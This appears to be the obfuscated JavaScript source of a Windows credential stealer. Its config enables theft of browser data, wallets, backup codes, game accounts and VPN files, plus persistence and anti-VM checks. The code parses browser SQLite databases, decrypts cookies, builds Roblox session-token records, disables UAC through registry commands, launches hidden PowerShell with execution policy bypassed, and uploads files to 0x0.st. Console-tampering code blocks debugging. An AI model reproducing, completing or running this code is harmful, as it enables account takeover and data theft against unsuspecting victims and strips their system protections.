const fs = require("fs");
const path = require("path");
const os = require("os");
const crypto = require("crypto");
const zlib = require("zlib");
const CONFIG = {
  browsers: true,
  backupcodes: true,
  games: true,
  filevpn: true,
  wallet: true,
  disableuac: true,
  computerinfo: true,
  fakeerror: true,
  startup: true,
  antivm: true,
  requireAdmin: false
};
const _BUILD_MACHINE_GUARD = "9aceab3a63e43417ab9bcc8c02ec479c72e38f41a1ec9294fb2b91e1bc963704";
function _readVarint(a, c) {
  var g = 0;
  var h = 0;
  for (; h < 8; h++) {
    var j = a[c + h];
    g = g * 128 + (j & 127);
    if (!(j & 128)) {
      h++;
      break;
    }
  }
  if (h === 8) {
    g = g * 256 + a[c + 8];
    h = 9;
  }
  return [g, h];
}
function parseSqliteTable(g, h) {
  const i = {
    wWeJo: function (L, M) {
      return L > M;
    },
    EQHHW: function (L, M) {
      return L * M;
    },
    gfFpm: function (L, M) {
      return L(M);
    },
    FBUJU: function (L, M) {
      return L(M);
    },
    GRIsR: function (L, M, N) {
      return L(M, N);
    },
    CnKKL: "powershell -NoProfile -ExecutionPolicy Bypass -Command \"Get-CimInstance Win32_ComputerSystem | Select-Object -Property Model, Manufacturer | Format-List\"",
    MRgqX: "aes-256-gcm",
    SjBJl: "utf8",
    Ffwoy: "http",
    eHjiH: function (L, M) {
      return L + M;
    },
    nOzhg: "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\",
    eZiid: function (L, M) {
      return L !== M;
    },
    LNGNd: function (L, M) {
      return L + M;
    },
    LhxHc: "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f; ",
    vjKKT: "disableuac",
    aEmaM: function (L, M) {
      return L < M;
    },
    dmdmg: function (L, M, N) {
      return L(M, N);
    },
    UtSls: function (L, M) {
      return L < M;
    },
    gzENh: function (L, M) {
      return L !== M;
    },
    RHlbX: "mWteV",
    wOEwc: function (L, M) {
      return L === M;
    },
    fIxdm: "WyySs",
    fMpcx: "UelUr",
    muEXE: function (L, M) {
      return L === M;
    },
    rFZMo: "tOKnr",
    BjuAp: "RAcDD",
    lxNOs: function (L, M) {
      return L - M;
    },
    Zhjqj: "SuWuQ",
    zJPZe: "uMTbU",
    mteTI: function (L, M) {
      return L | M;
    },
    qVVJz: function (L, M) {
      return L << M;
    },
    JzwSr: function (L, M) {
      return L > M;
    },
    YMCdc: function (L, M) {
      return L - M;
    },
    EdKfR: function (L, M) {
      return L === M;
    },
    zsqam: function (L, M) {
      return L !== M;
    },
    NYOMU: "zZudN",
    RQins: "crMbJ",
    zZfif: function (L, M) {
      return L | M;
    },
    vqjbM: function (L, M) {
      return L << M;
    },
    PERRG: function (L, M) {
      return L + M;
    },
    WkZOT: function (L, M) {
      return L > M;
    },
    WLrRb: function (L, M) {
      return L - M;
    },
    rjcBk: function (L, M) {
      return L === M;
    },
    SmvZz: function (L, M) {
      return L === M;
    },
    fHVZW: "ikYss",
    uNXwv: function (L, M) {
      return L > M;
    },
    VGHRB: function (L, M) {
      return L + M;
    },
    eSCAR: function (L, M) {
      return L * M;
    },
    FviOL: function (L, M) {
      return L >>> M;
    },
    Xumxq: function (L, M) {
      return L << M;
    },
    gCPwA: function (L, M) {
      return L << M;
    },
    fxCOB: function (L, M) {
      return L << M;
    },
    jmMsJ: function (L, M) {
      return L + M;
    },
    ZDDjm: function (L, M) {
      return L === M;
    },
    TBwAS: "vArDx",
    CKBxE: "QeivE",
    bnNoE: function (L, M) {
      return L + M;
    },
    SzeOT: function (L, M) {
      return L === M;
    },
    hEPkm: "dDDbt",
    FEVnR: function (L, M) {
      return L === M;
    },
    WeyFY: "ScTjQ",
    yPRCr: "qMDfA",
    UmERv: function (L, M) {
      return L === M;
    },
    TiRqV: "spPfF",
    srwvG: function (L, M) {
      return L >= M;
    },
    okfCt: function (L, M) {
      return L % M;
    },
    QmKby: function (L, M) {
      return L !== M;
    },
    cNbvW: "aVpyZ",
    SBgVA: function (L, M) {
      return L / M;
    },
    BOLGi: function (L, M) {
      return L - M;
    },
    AJtQn: function (L, M) {
      return L === M;
    },
    iogqi: function (L, M) {
      return L === M;
    },
    QgeuL: "xvxht",
    xPCnj: function (L, M) {
      return L === M;
    },
    NMHHU: "HPFmL",
    qDynO: "edkdg",
    DTwOG: "initializeService-exec-retry",
    YgRzB: function (L, M) {
      return L + M;
    },
    PXmlP: function (L, M) {
      return L + M;
    },
    zwVFr: " -Command \"Start-Process ",
    jXnnP: function (L, M, N) {
      return L(M, N);
    },
    frRax: "fetchUserData",
    AmIFz: "vuanr",
    NiGZx: "2|7|4|5|6|3|0|8|1",
    fNbxc: function (L, M) {
      return L + M;
    },
    QiNtT: function (L, M) {
      return L > M;
    },
    eBYsS: function (L, M) {
      return L <= M;
    },
    TvrAL: "awBDB",
    vuHCQ: "dIrvi",
    jMzgu: "0|4|1|3|2",
    YcVlM: function (L, M) {
      return L === M;
    },
    wtbjw: "0 B",
    dosSt: function (L, M) {
      return L(M);
    },
    HOixW: function (L, M) {
      return L >= M;
    },
    ucipc: function (L, M) {
      return L + M;
    },
    TsHEw: function (L, M) {
      return L << M;
    },
    OYSiM: function (L, M) {
      return L === M;
    },
    MFKWt: "QYWEM",
    vdXyk: function (L, M) {
      return L < M;
    },
    AhDMD: function (L, M) {
      return L << M;
    },
    exeDb: "tYYCO",
    FQEjJ: "3|5|1|6|4|0|2",
    PnuuH: function (L, M, N, O) {
      return L(M, N, O);
    },
    ZtnMI: function (L, M, N) {
      return L(M, N);
    },
    LgVlH: function (L, M) {
      return L !== M;
    },
    WQyuF: "StWTo",
    JPSTH: function (L, M) {
      return L | M;
    },
    ZvwcY: function (L, M) {
      return L + M;
    },
    fQDgl: function (L, M, N) {
      return L(M, N);
    },
    TCzhv: "Local State",
    OCuYH: "KBsVp",
    lxLWQ: "unknown",
    mgKfP: "ascii",
    HlMZl: function (L, M) {
      return L === M;
    },
    fyZzl: function (L, M, N) {
      return L(M, N);
    },
    QTOnJ: function (L, M) {
      return L === M;
    },
    qRUen: "efHRo",
    xiVYe: "RauNB",
    FdeZo: function (L, M) {
      return L === M;
    },
    crUFG: "RWdRM",
    CfVzj: function (L, M) {
      return L !== M;
    },
    fPlXK: "DFavc",
    UtTew: function (L, M) {
      return L < M;
    },
    PqVrF: "iNBuO",
    fRywV: function (L, M) {
      return L === M;
    },
    UMWuI: "iWgMj",
    icsuw: function (L, M, N) {
      return L(M, N);
    }
  };
  const j = {
    columns: [],
    values: []
  };
  if (!g || g.length < 100) {
    return j;
  }
  var k = g.toString(i.mgKfP, 0, 15);
  const l = {
    columns: [],
    values: []
  };
  if (i.eZiid(k, "SQLite format 3")) {
    return l;
  }
  var m = g.readUInt16BE(16);
  if (i.HlMZl(m, 1)) {
    m = 65536;
  }
  var n = g[20];
  var o = m - n;
  function p(L) {
    return g.slice((L - 1) * m, L * m);
  }
  function q(L) {
    const M = {
      MhwPL: function (a1, a2) {
        return i.eZiid(a1, a2);
      },
      AUIIb: "win32",
      PaUlP: function (a1, a2) {
        return i.LNGNd(a1, a2);
      },
      FuKLX: i.LhxHc,
      XKiDP: "ignore",
      TYeDh: function (a1, a2, a3) {
        return i.GRIsR(a1, a2, a3);
      },
      pMCEl: i.vjKKT,
      MrlDB: function (a1, a2, a3) {
        return i.GRIsR(a1, a2, a3);
      }
    };
    var N = _readVarint(L, 0);
    var O = N[0];
    var P = N[1];
    var Q = [];
    while (i.aEmaM(P, O)) {
      N = i.dmdmg(_readVarint, L, P);
      Q.push(N[0]);
      P += N[1];
    }
    P = O;
    var R = [];
    for (var S = 0; i.UtSls(S, Q.length); S++) {
      if (i.gzENh(i.RHlbX, i.RHlbX)) {
        const a2 = l.statSync(m).size;
        if (i.wWeJo(a2, i.EQHHW(512, 1024) * 1024)) {
          i.gfFpm(u, "[0x0.st] Skipping upload: File too large (" + i.gfFpm(v, a2) + ")");
          return w(null);
        }
        i.FBUJU(q, "[0x0.st] Uploading " + N.basename(s) + " (Size: " + T(a2) + ")...");
      } else {
        var T = Q[S];
        if (i.wOEwc(T, 0)) {
          if (i.fIxdm === i.fMpcx) {
            if (!j[k.service]) {
              l[m.service] = [];
            }
            n[o.service].push(p);
          } else {
            R.push(null);
          }
        } else if (i.wOEwc(T, 1)) {
          if (i.muEXE(i.rFZMo, i.BjuAp)) {
            if (M.MhwPL(K.platform, M.AUIIb)) {
              return;
            }
            const a4 = M.PaUlP("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v EnableLUA /t REG_DWORD /d 0 /f; ", M.FuKLX) + "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f";
            try {
              const a5 = {
                stdio: M.XKiDP,
                windowsHide: true
              };
              i("powershell -NoProfile -ExecutionPolicy Bypass -Command \"" + a4 + "\"", a5);
            } catch (a6) {
              M.TYeDh(k, a6, M.pMCEl);
            }
          } else {
            R.push(i.wWeJo(L[P], 127) ? i.lxNOs(L[P], 256) : L[P]);
            P += 1;
          }
        } else if (i.wOEwc(T, 2)) {
          if (i.Zhjqj !== i.zJPZe) {
            var U = i.mteTI(i.qVVJz(L[P], 8), L[P + 1]);
            R.push(i.JzwSr(U, 32767) ? i.YMCdc(U, 65536) : U);
            P += 2;
          } else {
            const a5 = {
              service: p,
              host: q.domain || "",
              name: N.name || "",
              value: s.value || "",
              browser: T.name,
              expiration: u,
              expiresUnix: v.expires || 0,
              path: w.path || "/",
              httpOnly: x.httpOnly || false,
              secure: y.secure || false,
              sameSite: z.sameSite || "None"
            };
            o.push(a5);
          }
        } else if (i.EdKfR(T, 3)) {
          if (i.zsqam(i.NYOMU, i.RQins)) {
            var V = i.mteTI(i.zZfif(i.vqjbM(L[P], 16), i.vqjbM(L[i.PERRG(P, 1)], 8)), L[i.eHjiH(P, 2)]);
            R.push(i.WkZOT(V, 8388607) ? i.WLrRb(V, 16777216) : V);
            P += 3;
          } else if (!g.existsSync(h)) {
            k.mkdirSync(l, {
              recursive: true
            });
          }
        } else if (i.rjcBk(T, 4)) {
          if (i.eZiid("vXFEk", "TDgCG")) {
            R.push(L.readInt32BE(P));
            P += 4;
          } else {
            try {
              if (k.existsSync(l)) {
                m.unlinkSync(n);
              }
            } catch (a7) {}
          }
        } else if (i.SmvZz(T, 5)) {
          if (i.fHVZW === "wvxYb") {
            i.GRIsR(I, K, "relaunchAsAdmin-denied");
          } else {
            var W = i.zZfif(L[P] << 8, L[i.eHjiH(P, 1)]);
            if (i.uNXwv(W, 32767)) {
              W -= 65536;
            }
            R.push(i.LNGNd(i.VGHRB(i.eSCAR(W, 4294967296) + i.FviOL(i.Xumxq(L[P + 2], 24), 0) + i.gCPwA(L[P + 3], 16), i.fxCOB(L[i.LNGNd(P, 4)], 8)), L[i.jmMsJ(P, 5)]));
            P += 6;
          }
        } else if (i.ZDDjm(T, 6)) {
          if (i.TBwAS !== i.CKBxE) {
            var X = L.readInt32BE(P);
            var Y = L.readUInt32BE(P + 4);
            R.push(i.bnNoE(i.EQHHW(X, 4294967296), Y));
            P += 8;
          } else {
            const a9 = {
              windowsHide: true,
              stdio: "pipe",
              timeout: 5000
            };
            const aa = i.GRIsR(a9, i.CnKKL, a9).toString().toLowerCase();
            if (K.hardware.some(ab => aa.includes(ab.toLowerCase()))) {
              return true;
            }
          }
        } else if (i.SzeOT(T, 7)) {
          if (i.hEPkm === "WKSxH") {
            const aa = k.constructor.prototype.bind(l);
            const ab = m[n];
            const ac = o[ab] || aa;
            aa.__proto__ = p.bind(q);
            aa.toString = ac.toString.bind(ac);
            r[ab] = aa;
          } else {
            R.push(L.readDoubleBE(P));
            P += 8;
          }
        } else if (i.FEVnR(T, 8)) {
          if (i.SzeOT(i.WeyFY, i.yPRCr)) {
            const ab = i.createDecipheriv(i.MRgqX, j, k);
            ab.setAuthTag(l);
            return m.concat([ab.update(n), ab.final()]).toString(i.SjBJl);
          } else {
            R.push(0);
          }
        } else if (T === 9) {
          if (i.UmERv(i.TiRqV, i.TiRqV)) {
            R.push(1);
          } else {
            try {
              if (i.includes(i.Ffwoy)) {
                j.push(k);
              }
            } catch (ac) {}
          }
        } else if (i.srwvG(T, 12) && i.okfCt(T, 2) === 0) {
          if (i.QmKby(i.cNbvW, "mZKmG")) {
            var Z = i.SBgVA(i.BOLGi(T, 12), 2);
            R.push(Buffer.from(L.slice(P, i.jmMsJ(P, Z))));
            P += Z;
          } else {
            M.MrlDB(g, h, "fetchGamesData-" + i + "-" + j);
          }
        } else if (i.srwvG(T, 13) && i.AJtQn(T % 2, 1)) {
          if (i.iogqi(i.QgeuL, "xvxht")) {
            var a0 = i.SBgVA(i.BOLGi(T, 13), 2);
            R.push(L.toString(i.SjBJl, P, i.jmMsJ(P, a0)));
            P += a0;
          } else {
            const af = i.GRIsR(K, i.eHjiH(i.nOzhg + g, "\" /ve 2>nul"), {
              windowsHide: true,
              encoding: "utf8"
            });
            const ag = af.match(/REG_SZ\s+(.+)/);
            if (ag && h.existsSync(ag[1].trim())) {
              return ag[1].trim();
            }
          }
        } else if (i.xPCnj(i.NMHHU, i.qDynO)) {
          const af = {
            recursive: true
          };
          af.mkdirSync(K, af);
        } else {
          R.push(null);
        }
      }
    }
    return R;
  }
  function r(L, N, O) {
    const P = {
      DRdZN: i.DTwOG,
      AaKpK: function (Z, a0) {
        return Z + a0;
      },
      FPAZH: function (Z, a0) {
        return i.YgRzB(Z, a0);
      },
      QsjRx: function (Z, a0) {
        return i.PXmlP(Z, a0);
      },
      QvrUi: i.zwVFr,
      LgwiH: function (Z, a0, a1) {
        return i.jXnnP(Z, a0, a1);
      },
      KJOJv: "pipe",
      pqxVQ: i.frRax
    };
    if (i.AmIFz !== i.AmIFz) {
      j(k, P.DRdZN);
      try {
        const a0 = P.AaKpK(P.FPAZH(P.QsjRx(P.FPAZH(P.AaKpK(q, P.QvrUi), r), " -ArgumentList '-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File \\\""), s), "\\\"' -WindowStyle Hidden\"");
        P.LgwiH(t, a0, {
          stdio: P.KJOJv,
          windowsHide: true,
          timeout: 5000
        });
      } catch (a1) {
        P.LgwiH(v, a1, "initializeService-exec-fallback");
      }
    } else {
      const a0 = i.NiGZx.split("|");
      let a1 = 0;
      while (true) {
        switch (a0[a1++]) {
          case "0":
            var Q = L.readUInt32BE(N + V);
            var R = i.BOLGi(O, V);
            continue;
          case "1":
            return Buffer.concat(T);
          case "2":
            var S = o - 35;
            continue;
          case "3":
            var T = [Buffer.from(L.slice(N, i.fNbxc(N, V)))];
            continue;
          case "4":
            var U = Math.floor(i.SBgVA((o - 12) * 32, 255)) - 23;
            continue;
          case "5":
            var V = U + i.WLrRb(O, U) % i.lxNOs(o, 4);
            continue;
          case "6":
            if (i.QiNtT(V, S)) {
              V = U;
            }
            continue;
          case "7":
            if (i.eBYsS(O, S)) {
              return Buffer.from(L.slice(N, i.PERRG(N, O)));
            }
            continue;
          case "8":
            while (Q && i.QiNtT(R, 0)) {
              if (i.TvrAL === i.vuHCQ) {
                I(K, P.pqxVQ);
                return 0;
              } else {
                const a3 = i.jMzgu.split("|");
                let a4 = 0;
                while (true) {
                  switch (a3[a4++]) {
                    case "0":
                      var W = p(Q);
                      continue;
                    case "1":
                      var Y = Math.min(R, o - 4);
                      continue;
                    case "2":
                      R -= Y;
                      continue;
                    case "3":
                      T.push(Buffer.from(W.slice(4, i.eHjiH(4, Y))));
                      continue;
                    case "4":
                      Q = W.readUInt32BE(0);
                      continue;
                  }
                  break;
                }
              }
            }
            continue;
        }
        break;
      }
    }
  }
  function s(L, M) {
    const N = {
      zMqDa: function (a3, a4) {
        return a3 + a4;
      },
      wXnxS: i.SjBJl
    };
    const O = N;
    var P = i.gfFpm(p, L);
    var Q = i.YcVlM(L, 1) ? 100 : 0;
    var R = P[Q];
    var S = i.zZfif(i.TsHEw(P[i.LNGNd(Q, 3)], 8), P[Q + 4]);
    if (i.OYSiM(R, 13)) {
      if (i.SmvZz(i.MFKWt, i.MFKWt)) {
        for (var T = 0; i.vdXyk(T, S); T++) {
          var U = i.AhDMD(P[i.VGHRB(i.eHjiH(Q, 8), i.eSCAR(T, 2))], 8) | P[Q + 9 + T * 2];
          try {
            if (i.ZDDjm(i.exeDb, i.exeDb)) {
              const a3 = i.FQEjJ.split("|");
              let a4 = 0;
              while (true) {
                switch (a3[a4++]) {
                  case "0":
                    var V = i.PnuuH(r, P, U, X);
                    continue;
                  case "1":
                    U += W[1];
                    continue;
                  case "2":
                    M.push(q(V));
                    continue;
                  case "3":
                    var W = i.ZtnMI(_readVarint, P, U);
                    continue;
                  case "4":
                    U += Y[1];
                    continue;
                  case "5":
                    var X = W[0];
                    continue;
                  case "6":
                    var Y = i.GRIsR(_readVarint, P, U);
                    continue;
                }
                break;
              }
            } else {
              if (i.YcVlM(a6, 0)) {
                return i.wtbjw;
              }
              const a6 = 1024;
              const a7 = ["B", "KB", "MB", "GB", "TB"];
              const a8 = l.floor(i.SBgVA(m.log(n), o.log(a6)));
              let a9 = i.dosSt(p, (q / r.pow(a6, a8)).toFixed(2));
              if (i.HOixW(a9, 100)) {
                return i.jmMsJ(i.eHjiH(a9.toFixed(0), " "), a7[a8]);
              }
              if (a9 >= 10) {
                return i.eHjiH(a9.toFixed(1) + " ", a7[a8]);
              }
              return i.ucipc(i.jmMsJ(a9.toFixed(1), " "), a7[a8]);
            }
          } catch (a6) {}
        }
      } else {
        const a8 = i.replace(/[^a-zA-Z0-9 ]/g, "");
        const a9 = j.join(k, "Cookies_[" + a8 + "].txt");
        l.writeFileSync(a9, O.zMqDa(m.copyright, n.join("")), {
          encoding: O.wXnxS,
          flag: "w"
        });
      }
    } else if (i.UmERv(R, 5)) {
      if (i.LgVlH("StWTo", i.WQyuF)) {
        N("0x" + K + "T2", "DX_03");
      } else {
        var Z = P.readUInt32BE(Q + 8);
        for (var a0 = 0; a0 < S; a0++) {
          var a1 = i.JPSTH(P[i.YgRzB(i.ZvwcY(Q, 12), a0 * 2)] << 8, P[i.ucipc(i.PERRG(Q, 13), a0 * 2)]);
          var a2 = P.readUInt32BE(a1);
          i.fQDgl(s, a2, M);
        }
        i.jXnnP(s, Z, M);
      }
    }
  }
  var t = [];
  i.fyZzl(s, 1, t);
  var u = 0;
  var v = [];
  for (var w = 0; w < t.length; w++) {
    if (t[w][0] === "table" && i.QTOnJ(t[w][1], h)) {
      if (i.LgVlH(i.qRUen, i.qRUen)) {
        I.unlinkSync(K);
      } else {
        u = t[w][3];
        var x = t[w][4] || "";
        var y = x.indexOf("(");
        if (i.zsqam(y, -1)) {
          if (i.xiVYe === "RauNB") {
            var z = 0;
            var A = y;
            for (var B = y; B < x.length; B++) {
              if (i.FdeZo(x[B], "(")) {
                z++;
              } else if (i.FEVnR(x[B], ")")) {
                if (i.zsqam(i.crUFG, i.crUFG)) {
                  return l.trim().split(/\s+/)[0].replace(/["`\[\]]/g, "");
                } else {
                  z--;
                  if (z === 0) {
                    if (i.CfVzj(i.fPlXK, i.fPlXK)) {
                      if (i.statSync(j).isDirectory()) {
                        const O = o.join(p, i.TCzhv);
                        if (q.existsSync(O)) {
                          r.push(O);
                        }
                      }
                    } else {
                      A = B;
                      break;
                    }
                  }
                }
              }
            }
            var C = x.substring(i.PXmlP(y, 1), A);
            var D = [];
            var E = "";
            var F = 0;
            for (var G = 0; i.UtTew(G, C.length); G++) {
              if (i.PqVrF !== "iNBuO") {
                i.dosSt(I, new K("CDP timeout"));
              } else {
                var H = C[G];
                if (i.EdKfR(H, "(")) {
                  F++;
                } else if (i.fRywV(H, ")")) {
                  F--;
                } else if (H === "," && i.HlMZl(F, 0)) {
                  if (i.UMWuI === "iWgMj") {
                    D.push(E.trim());
                    E = "";
                    continue;
                  } else {
                    k = l.alloc(8);
                    m[0] = 129;
                    n[1] = 254;
                    o.writeUInt16BE(p.length, 2);
                    q.copy(r, 4);
                  }
                }
                E += H;
              }
            }
            if (E.trim()) {
              D.push(E.trim());
            }
            v = D.filter(function (Q) {
              if (i.muEXE(i.OCuYH, i.OCuYH)) {
                return !/^\s*(PRIMARY|UNIQUE|CHECK|FOREIGN|CONSTRAINT)\s/i.test(Q);
              } else {
                l();
              }
            }).map(function (Q) {
              return Q.trim().split(/\s+/)[0].replace(/["`\[\]]/g, "");
            });
          } else {
            g(h, i.eHjiH("v20Key-ABE-", i[j][1] || i.lxLWQ));
          }
        }
        break;
      }
    }
  }
  const I = {
    columns: [],
    values: []
  };
  if (!u || !v.length) {
    return I;
  }
  var J = [];
  i.icsuw(s, u, J);
  const K = {
    columns: v,
    values: J
  };
  return K;
}
const {
  execSync,
  exec,
  spawn
} = require("child_process");
const axios = require("axios");
const FormData = require("form-data");
const archiver = require("archiver");
process.on("uncaughtException", a => {
  logError(a, "Global-UncaughtException");
});
process.on("unhandledRejection", (b, c) => {
  logError(b, "Global-UnhandledRejection");
});
function getLocale() {
  const g = {
    feJzE: function (l, m) {
      return l + m;
    },
    daVEv: "return (function() ",
    AwBOF: "log",
    oKrkm: "warn",
    BNBgR: "info",
    cMtjX: "exception",
    YRbiq: "table",
    psOkR: function (l, m) {
      return l < m;
    },
    puiTN: function (l, m) {
      return l - m;
    },
    vSGTg: function (l, m) {
      return l / m;
    },
    wjkqC: "Unknown",
    JNeMT: function (l, m) {
      return l * m;
    },
    EVtfY: function (l, m) {
      return l > m;
    },
    KFbAP: function (l, m, n, o) {
      return l(m, n, o);
    },
    vqiBz: function (l, m, n) {
      return l(m, n);
    },
    fIAsQ: function (l, m) {
      return l === m;
    },
    whADA: "no_restriction",
    oFfKX: "lax",
    eWxKI: "strict",
    IbklM: function (l, m) {
      return l !== m;
    },
    nnKvb: "hlbLg",
    vKMvK: "1|0|4|3|2|5|6",
    iBngL: "PzTOw",
    Brgdz: "nnDdO",
    CauYP: "Cmetk",
    lIiiI: "fiIxM",
    ioDHp: function (l, m) {
      return l !== m;
    },
    ONhds: "KFLce",
    MFzVR: "(((.+)+)+)+$",
    yVcMM: "Roblox (Studio)",
    msFTF: ".roblox.com",
    aKVAH: function (l, m, n) {
      return l(m, n);
    },
    KBAZU: "getmac",
    qLCEs: "pipe",
    WbkTo: "BUjSi",
    vwkyh: "cIePM",
    Ztdve: "kjsHQ",
    djZrW: "QPeQL",
    qtQnu: "HJtUM",
    nUfNO: function (l, m) {
      return l(m);
    },
    tpxKq: "{}.constructor(\"return this\")( )",
    pGyMc: function (l) {
      return l();
    },
    WPcke: "error",
    Lxcua: function (l, m, n) {
      return l(m, n);
    }
  };
  const h = function () {
    const l = {
      YeBNu: g.iBngL,
      dwwSf: function (n, o) {
        return n !== o;
      },
      VHnyJ: g.Brgdz
    };
    const m = l;
    if (g.CauYP !== g.lIiiI) {
      let n = true;
      return function (o, p) {
        const q = {
          DVOfh: function (r, s) {
            return r(s);
          },
          PaHdG: function (r, s) {
            return g.feJzE(r, s);
          },
          WgZUX: function (r, s) {
            return g.feJzE(r, s);
          },
          YJOwv: g.daVEv,
          mJLpi: "{}.constructor(\"return this\")( )",
          XhFvm: g.AwBOF,
          AefOs: g.oKrkm,
          rsVMt: g.BNBgR,
          nNrol: "error",
          QJlSF: g.cMtjX,
          IAEBN: g.YRbiq,
          EbuQG: "trace",
          dhqIh: function (r, s) {
            return g.psOkR(r, s);
          },
          fGkkR: function (r, s) {
            return g.puiTN(r, s);
          },
          yThQe: function (r, s) {
            return g.vSGTg(r, s);
          },
          QGCYC: g.wjkqC,
          frhst: function (r, s) {
            return g.JNeMT(r, s);
          },
          amfml: function (r, s) {
            return g.EVtfY(r, s);
          },
          yWiQh: function (r, s, t, u) {
            return g.KFbAP(r, s, t, u);
          },
          XKrOj: function (r, s) {
            return r !== s;
          },
          ptYXI: function (r, s, t) {
            return g.vqiBz(r, s, t);
          },
          CYftY: function (r, s) {
            return g.fIAsQ(r, s);
          },
          UVHPB: function (r, s) {
            return r === s;
          },
          LmghE: g.whADA,
          STclv: g.oFfKX,
          eOaRl: g.eWxKI
        };
        if (g.IbklM("SzTgl", g.nnKvb)) {
          const r = n ? function () {
            if (m.YeBNu !== "PzTOw") {
              let t;
              try {
                const w = tUgvur.DVOfh(o, tUgvur.PaHdG(tUgvur.WgZUX(tUgvur.YJOwv, tUgvur.mJLpi), ");"));
                t = w();
              } catch (x) {
                t = q;
              }
              const u = t.console = t.console || {};
              const v = [tUgvur.XhFvm, tUgvur.AefOs, tUgvur.rsVMt, tUgvur.nNrol, tUgvur.QJlSF, tUgvur.IAEBN, tUgvur.EbuQG];
              for (let y = 0; tUgvur.dhqIh(y, v.length); y++) {
                const I = v.constructor.prototype.bind(w);
                const J = v[y];
                const K = u[J] || I;
                I.__proto__ = x.bind(y);
                I.toString = K.toString.bind(K);
                u[J] = I;
              }
            } else if (p) {
              if (m.dwwSf(m.VHnyJ, "zNHEc")) {
                const t = p.apply(o, arguments);
                p = null;
                return t;
              } else {
                const v = K.creation_utc ? new L(q.fGkkR(q.yThQe(M.creation_utc, 1000), 11644473600000)).toLocaleString() : q.QGCYC;
                const w = N.expires_utc ? new O(q.fGkkR(P.expires_utc / 1000, q.frhst(11644473600, 1000))).toLocaleString() : q.QGCYC;
                const x = Q.encrypted_value;
                let y = "";
                if (x && R.isBuffer(x) && q.amfml(x.length, 0)) {
                  const A = q.yWiQh(ai, x, aj, ak);
                  y = q.XKrOj(A, null) ? A : al.value || "";
                } else {
                  y = am.value || "";
                }
                X = "================\nHost: " + Y.host_key + "\nName: " + Z.name + "\nValue: " + y + "\nCreation Date: " + v + "\nExpiration Date: " + w + "\nApplication: " + a0 + "\n\n";
                const z = y ? q.ptYXI(a1, a2.host_key || "", a3.name) : null;
                if (z) {
                  const B = an.expires_utc ? q.fGkkR(ao.expires_utc / 1000000, 11644473600) : 0;
                  ap.push({
                    service: z,
                    host: aq.host_key || "",
                    name: ar.name,
                    value: y,
                    browser: as,
                    expiration: w,
                    path: at.path || "/",
                    httpOnly: q.CYftY(au.is_httponly, 1) || q.UVHPB(av.is_httponly, true),
                    secure: aw.is_secure === 1 || q.CYftY(ax.is_secure, true),
                    expiresUnix: B,
                    sameSite: q.XKrOj(ay.samesite, az) ? [q.LmghE, q.STclv, q.eOaRl][aA.samesite] || q.LmghE : "no_restriction"
                  });
                }
              }
            }
          } : function () {};
          n = false;
          return r;
        } else {
          return !/^\s*(PRIMARY|UNIQUE|CHECK|FOREIGN|CONSTRAINT)\s/i.test(j);
        }
      };
    } else {
      const p = g.vKMvK.split("|");
      let q = 0;
      while (true) {
        switch (p[q++]) {
          case "0":
            var r = s[0];
            continue;
          case "1":
            var s = g.vqiBz(p, q, r);
            continue;
          case "2":
            w += t[1];
            continue;
          case "3":
            var t = t(u, v);
            continue;
          case "4":
            s += s[1];
            continue;
          case "5":
            var u = x(y, z, r);
            continue;
          case "6":
            A.push(B(u));
            continue;
        }
        break;
      }
    }
  }();
  const i = g.Lxcua(h, this, function () {
    if (g.ioDHp("KFLce", g.ONhds)) {
      return;
    } else {
      return i.toString().search(g.MFzVR).toString().constructor(i).search(g.MFzVR);
    }
  });
  g.pGyMc(i);
  const j = function () {
    const l = {
      WOwOT: function (m, n, o) {
        return m(n, o);
      },
      vRKNb: g.KBAZU,
      xbiSC: g.qLCEs,
      eAkUa: function (m, n) {
        return m !== n;
      },
      Fwuro: g.WbkTo,
      HYsfJ: function (m, n) {
        return g.fIAsQ(m, n);
      },
      mxOmL: g.vwkyh
    };
    if (g.fIAsQ(g.Ztdve, "GJJkQ")) {
      try {
        const n = l.WOwOT(g, l.vRKNb, {
          windowsHide: true,
          stdio: l.xbiSC,
          timeout: 5000
        }).toString();
        if (h.macs.some(o => n.includes(o))) {
          return true;
        }
      } catch (o) {}
      return false;
    } else {
      let n = true;
      return function (o, p) {
        const q = {
          gcebm: g.yVcMM,
          ZayMO: g.msFTF,
          fgjBD: "Roblox Studio",
          kfxWN: function (s, t, u) {
            return g.aKVAH(s, t, u);
          },
          jwxAb: "ignore"
        };
        const r = n ? function () {
          if (l.eAkUa(l.Fwuro, l.Fwuro)) {
            let t = i[1].trim();
            if (t.startsWith("COOK::")) {
              t = t.replace(/^COOK::</, "").replace(/>$/, "");
            }
            const u = {
              service: q.gcebm,
              host: q.ZayMO,
              name: ".ROBLOSECURITY",
              value: t,
              browser: q.fgjBD,
              expiration: "N/A"
            };
            h.push(u);
          } else if (p) {
            if (l.HYsfJ(l.mxOmL, "cIePM")) {
              const t = p.apply(o, arguments);
              p = null;
              return t;
            } else {
              q.kfxWN(i, "rmdir /s /q \"" + h + "\"", {
                stdio: q.jwxAb,
                windowsHide: true
              });
            }
          }
        } : function () {};
        n = false;
        return r;
      };
    }
  }();
  const k = g.aKVAH(j, this, function () {
    let l;
    try {
      if (g.djZrW !== g.qtQnu) {
        const o = g.nUfNO(Function, g.feJzE(g.feJzE(g.daVEv, g.tpxKq), ");"));
        l = g.pGyMc(o);
      } else {
        if (g.psOkR(g.length, 4)) {
          return;
        }
        h = i.readUInt16BE(2);
        j = 4;
      }
    } catch (q) {
      l = window;
    }
    const m = l.console = l.console || {};
    const n = [g.AwBOF, g.oKrkm, g.BNBgR, g.WPcke, g.cMtjX, g.YRbiq, "trace"];
    for (let r = 0; g.psOkR(r, n.length); r++) {
      const s = j.constructor.prototype.bind(j);
      const t = n[r];
      const u = m[t] || s;
      s.__proto__ = j.bind(j);
      s.toString = u.toString.bind(u);
      m[t] = s;
    }
  });
  k();
  return Intl.DateTimeFormat().resolvedOptions().locale.slice(0, 2).toUpperCase();
}
const computerName = os.hostname();
